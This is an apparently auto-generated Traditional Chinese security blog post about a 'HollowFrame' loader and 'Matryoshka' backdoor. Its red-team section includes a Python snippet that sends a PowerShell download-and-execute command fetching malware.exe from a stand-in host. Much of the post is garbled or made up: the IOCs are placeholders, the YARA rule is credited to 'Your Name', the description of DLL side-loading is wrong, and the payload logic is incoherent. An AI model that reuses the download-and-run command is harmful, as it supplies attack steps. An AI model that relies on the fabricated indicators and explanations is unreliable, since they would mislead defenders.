---
layout: post
title:  "HollowFrame Loader Deploys Matryoshka Backdoor in Spear-Phishing Attack on Law Firm"
date:   2026-07-31 19:13:06 +0000
categories: [security]
severity: critical
---

# 🚨 解析 HollowFrame 和 Matryoshka：一種複雜的惡意軟件攻擊框架

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: DLL Side-Loading, GitHub C2, PowerShell

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

HollowFrame 和 Matryoshka 是一種複雜的惡意軟件攻擊框架，利用 DLL Side-Loading 和 GitHub C2 等技術來實現遠程代碼執行和命令控制。攻擊流程圖解如下：

```
User Input -> LNK File -> PowerShell -> HollowFrame (DLL Side-Loading) -> Matryoshka (GitHub C2)

```
受影響元件包括 Windows 10 和 Windows Server 2019。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

攻擊前置需求包括：

* 權限： Administrator
* 網路位置： Internet

Payload 建構邏輯如下：

```

python
import requests

# HollowFrame Payload
hollowframe_payload = {
    "version": "1.0",
    "command": "exec",
    "args": ["powershell", "-Command", "Invoke-WebRequest -Uri https://example.com/malware.exe -OutFile C:\\Windows\\Temp\\malware.exe"]
}

# Matryoshka Payload
matryoshka_payload = {
    "version": "1.0",
    "command": "exec",
    "args": ["C:\\Windows\\Temp\\malware.exe"]
}

# Send Payload to C2 Server
requests.post("https://example.com/c2", json=hollowframe_payload)
requests.post("https://example.com/c2", json=matryoshka_payload)

```
繞過技術包括使用 GitHub C2 來避免被偵測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

IOCs (入侵指標)如下：

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\\Windows\\Temp\\malware.exe |
偵測規則如下：

```

yara
rule HollowFrame {
    meta:
        description = "HollowFrame Malware"
        author = "Your Name"
    strings:
        $hollowframe_string = "HollowFrame"
    condition:
        $hollowframe_string at 0
}

```
緩解措施包括：

* 更新 Windows 和 PowerShell
* 禁止使用 LNK 文件
* 監控 PowerShell 活動

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **DLL Side-Loading**: 想像兩個 DLL 文件同時被載入記憶體，且其中一個是惡意的。技術上是指惡意 DLL 文件被載入記憶體，然後被合法的應用程式調用。
* **GitHub C2**: 想像一個 GitHub 倉庫被用作命令控制伺服器。技術上是指使用 GitHub API 來發送和接收命令和資料。
* **PowerShell**: 想像一個強大的命令列工具。技術上是指 PowerShell 是一個由 Microsoft 開發的命令列工具和腳本語言。

## 5. 🔗 參考文獻與延伸閱讀

* [原始報告](https://thehackernews.com/2026/07/hollowframe-loader-deploys-matryoshka.html)
* [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


